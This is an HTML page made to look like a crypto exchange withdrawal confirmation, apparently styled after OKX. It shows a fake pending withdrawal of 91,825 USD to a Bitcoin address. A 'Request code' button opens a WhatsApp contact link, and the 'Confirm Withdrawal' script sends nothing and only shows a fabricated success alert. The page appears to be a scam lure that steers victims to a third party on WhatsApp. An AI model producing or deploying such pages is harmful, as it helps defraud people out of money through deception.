<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal Confirmation</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --font-sans: 'Inter', sans-serif;
            --font-display: 'Manrope', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }
        body {
            background-color: #000;
            color: #fff;
            font-family: var(--font-sans);
            margin: 0;
            -webkit-font-smoothing: antialiased;
        }
        .font-display { font-family: var(--font-display); }
        .font-mono { font-family: var(--font-mono); }
        
        .okx-input:focus-within {
            border-color: rgba(255,255,255,0.5);
            box-shadow: 0 0 0 1px rgba(255,255,255,0.1);
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .animate-spin {
            animation: spin 1s linear infinite;
        }
        
        .confirm-btn:active {
            transform: scale(0.98);
        }
        .confirm-btn:hover:not(:disabled) {
            box-shadow: 0 6px 20px rgba(255,255,255,0.3);
            transform: scale(1.01);
        }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen selection:bg-white/20">
    <div class="w-full max-w-[480px] flex-1 flex flex-col px-4 sm:px-6">
        
        <!-- Header -->
        <header class="flex items-center justify-between py-6">
            <button class="p-2 -ml-2 rounded-full hover:bg-white/10 transition-colors">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
            </button>
            <h1 class="text-lg font-display font-medium">Withdrawal</h1>
            <button class="p-2 -mr-2 rounded-full hover:bg-white/10 transition-colors">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
            </button>
        </header>

        <main class="flex-1 pb-24">
            <!-- Status -->
            <div class="flex flex-col items-center mt-4 mb-10">
                <div class="w-16 h-16 rounded-full bg-white/5 flex items-center justify-center mb-4 border border-white/10 shadow-[0_0_30px_rgba(255,255,255,0.05)]">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#FFB000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                </div>
                <h2 class="text-[13px] text-gray-400 uppercase tracking-widest font-semibold mb-1">Pending Confirmation</h2>
                <div class="text-4xl sm:text-5xl font-display font-semibold flex items-baseline gap-2">
                    91,825.00 <span class="text-2xl sm:text-3xl text-gray-500 font-medium">USD</span>
                </div>
            </div>

            <!-- Transaction Details -->
            <div class="bg-[#111] border border-[#222] rounded-[20px] p-5 shadow-2xl mb-8">
                <h3 class="text-base font-medium mb-4 flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
                    Transaction Details
                </h3>
                
                <div class="space-y-4">
                    <div class="flex justify-between items-start py-1">
                        <span class="text-sm text-gray-400">Address</span>
                        <span class="text-sm font-mono text-right max-w-[65%] break-all leading-relaxed bg-white/5 px-2 py-1 rounded">
                            3CeYkre4rRwBncvuZTxpf9not13rptLEV8
                        </span>
                    </div>
                    
                    <div class="flex justify-between items-center py-1">
                        <span class="text-sm text-gray-400">Network</span>
                        <span class="text-sm font-medium">BITCOIN (BTC)</span>
                    </div>
                    
                    <div class="flex justify-between items-center py-1">
                        <span class="text-sm text-gray-400">Network fee</span>
                        <span class="text-sm font-medium">25 USD</span>
                    </div>
                    
                    <div class="h-[1px] bg-white/10 my-2"></div>
                    
                    <div class="flex justify-between items-center py-1">
                        <span class="text-sm text-gray-400">Receive amount</span>
                        <span class="text-base font-display font-bold text-white">91,800.00 USDT</span>
                    </div>
                </div>
            </div>

            <!-- Verification -->
            <div>
                <div class="flex items-center justify-between mb-3">
                    <label class="text-sm font-medium text-white">Security verification</label>
                    <span class="text-xs text-gray-400">6 digits required</span>
                </div>
                
                <div class="relative flex items-center bg-[#111] border border-[#333] okx-input rounded-xl overflow-hidden transition-all duration-300">
                    <input
                        id="verification-code"
                        type="text"
                        maxlength="6"
                        placeholder="Enter verification code"
                        class="w-full bg-transparent px-4 py-4 outline-none text-white text-lg tracking-widest font-mono placeholder:tracking-normal placeholder:font-sans placeholder:text-[#555] placeholder:text-base"
                        autocomplete="off"
                    >
                    <button
                        onclick="handleRequestCode()"
                        class="absolute right-2 px-4 py-2 bg-white text-black text-sm font-semibold rounded-lg hover:bg-gray-200 active:scale-95 transition-all"
                    >
                        Request code
                    </button>
                </div>
                <p class="mt-3 text-xs text-gray-400 flex items-center gap-1.5">
                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
                    Code will be sent securely via WhatsApp
                </p>
            </div>
        </main>

        <!-- Bottom Button -->
        <div class="fixed bottom-0 left-0 right-0 p-4 sm:p-6 bg-gradient-to-t from-black via-black to-transparent flex justify-center pb-8">
            <div class="w-full max-w-[480px]">
                <button
                    id="confirm-button"
                    onclick="handleConfirm()"
                    disabled
                    class="confirm-button w-full py-4 rounded-xl font-display font-bold text-[17px] bg-white text-black shadow-[0_4px_14px_rgba(255,255,255,0.25)] disabled:opacity-40 disabled:cursor-not-allowed transition-all duration-200 flex justify-center items-center gap-2"
                >
                    Confirm Withdrawal
                </button>
            </div>
        </div>
    </div>

    <script>
        const input = document.getElementById('verification-code');
        const button = document.getElementById('confirm-button');

        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            button.disabled = e.target.value.length !== 6;
        });

        function handleRequestCode() {
            window.open("https://wa.me/message/635OGI47TGVGB1", "_blank");
        }

        function handleConfirm() {
            const code = input.value;
            if (code.length === 6) {
                button.disabled = true;
                button.innerHTML = `
                    <div class="w-5 h-5 border-2 border-black/30 border-t-black rounded-full animate-spin"></div>
                    Verifying...
                `;
                
                setTimeout(() => {
                    alert("Withdrawal Submitted. Your transaction is now being processed on the network.");
                    button.innerHTML = "Confirm Withdrawal";
                    button.disabled = false;
                    input.value = "";
                }, 2000);
            }
        }
    </script>
</body>
</html>
